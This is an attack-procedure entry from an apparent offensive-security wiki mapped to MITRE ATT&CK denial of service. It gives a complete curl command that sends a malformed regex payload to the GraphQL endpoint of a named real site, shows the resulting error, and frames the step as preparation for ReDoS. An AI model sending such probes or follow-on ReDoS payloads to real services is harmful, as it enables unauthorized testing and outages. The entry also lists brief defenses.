---
tags:
  - regex
  - confirm
  - syntax-error
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/confirm-mismatched-regex]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:25:53.216Z'
sub_techniques: []
id: 6cf28040-1a1a-43d6-abea-a3a6ec58c132
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Confirm-Regex-with-Mismatched-Pattern

## Summary

This procedure uses a mismatched regex pattern to generate a syntax error, confirming the backend's direct regex evaluation of the 'q' parameter.

## Description

Sending a payload like '\u0000)' causes an 'Unmatched ')' ' error in the regex engine, proving the input is fed into a regex constructor without proper escaping, setting up for ReDoS exploitation.

## Requirements

1. GraphQL endpoint access
2. curl tool
3. Understanding of regex syntax errors

## Defense

Defensive measures and detection strategies:

- Use safe regex libraries or pre-compile patterns
- Block malformed regex inputs at the application layer

## Objectives

1. Validate regex input handling
2. Infer vulnerable pattern structure
3. Confirm potential for backtracking attacks

## Instructions

### Step 1: Send Mismatched Payload

**Context**: Induce a regex parse error to expose engine usage.

**Command** ([[commands/confirm-mismatched-regex]]):
```bash
curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' --data-binary '{"query":"query { search(q: \"\\u0000)\", lang: \"en\") { _id weapon_id rarity collection{ _id name } collection_id } }"}' --compressed
```

> Response: 'Invalid regular expression: /(?=.*X))/: Unmatched ')' '.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Network Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/confirm-mismatched-regex]]

## Tools Used

- [[tools/curl]]

## Tags

- regex
- confirm
- syntax-error
